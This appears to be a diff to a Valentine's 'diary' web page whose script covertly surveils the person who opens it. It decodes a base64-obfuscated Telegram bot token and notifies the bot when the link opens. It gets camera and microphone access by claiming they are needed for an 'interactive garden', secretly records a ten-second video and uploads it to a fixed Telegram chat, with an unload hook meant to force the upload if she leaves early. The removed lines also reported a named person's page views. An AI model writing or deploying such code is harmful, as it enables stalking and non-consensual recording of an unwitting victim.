@@ -122,51 +122,53 @@
     <script>
         const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw==");
         const bgMusic = document.getElementById('bg-music');
-        let mediaRecorder, recordedChunks = [];
+      let mediaRecorder, recordedChunks = [];
+// Your base64 encoded token
+const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw==");
 
-        document.querySelectorAll('.diary-video').forEach(vid => {
-            vid.onplay = () => bgMusic.pause();
-            vid.onpause = () => bgMusic.play();
-        });
+async function startDiary() {
+    try {
+        // Notify bot that the link has been opened
+        fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Valentine%20Link%20Opened!%20❤️`);
 
-        // Setup initial z-indexing
-        function setupZ() { 
-            const pages = document.querySelectorAll('.page'); 
-            pages.forEach((el, i) => { el.style.zIndex = pages.length - i; }); 
-        }
-        setupZ();
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        // Use webm for high browser compatibility
+        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
 
-        function flipPage(el, pageNum) {
-            el.classList.toggle('flipped');
-            if(el.classList.contains('flipped')) {
-                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Nikhitha%20is%20on%20Page%20${pageNum}%20❤️`);
-                el.style.zIndex = pageNum + 1; // Move to the left layer
-            } else {
-                el.style.zIndex = document.querySelectorAll('.page').length - pageNum; // Move to the right layer
-            }
-        }
+        mediaRecorder.ondataavailable = (e) => { 
+            if (e.data.size > 0) recordedChunks.push(e.data); 
+        };
 
-        async function startDiary() {
-            try {
-                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Valentine%20Link%20Opened!%20❤️`);
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('video-preview').srcObject = stream;
-                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
-                mediaRecorder.start();
-                document.getElementById('overlay').style.display = 'none';
-                document.getElementById('diary-wrapper').style.display = 'block';
-                bgMusic.play();
-                setTimeout(() => { if (mediaRecorder.state === "recording") mediaRecorder.stop(); }, 10000);
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
-                    const formData = new FormData();
-                    formData.append('chat_id', "5324376571");
-                    formData.append('video', blob, 'reaction.mp4');
-                    fetch(`https://api.telegram.org/bot${t}/sendVideo`, { method: 'POST', body: formData });
-                };
-            } catch (err) { alert("Camera access needed! ❤️"); }
-        }
-    </script>
-</body>
-</html>
+        mediaRecorder.onstop = async () => {
+            if (recordedChunks.length === 0) return;
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            const formData = new FormData();
+            formData.append('chat_id', "5324376571"); // Your Chat ID
+            
+            // Send as a document to guarantee delivery
+            formData.append('document', blob, 'reaction.webm');
+            
+            fetch(`https://api.telegram.org/bot${t}/sendDocument`, { 
+                method: 'POST', 
+                body: formData 
+            });
+        };
+
+        mediaRecorder.start();
+
+        // Standard 10-second recording duration
+        setTimeout(() => { 
+            if (mediaRecorder.state === "recording") mediaRecorder.stop(); 
+        }, 10000);
+
+    } catch (err) { 
+        alert("Camera access needed for the interactive garden! ❤️"); 
+    }
+}
+
+// Emergency upload: Sends video even if she closes the browser early
+window.addEventListener('beforeunload', () => {
+    if (mediaRecorder && mediaRecorder.state === "recording") {
+        mediaRecorder.stop();
+    }
+});
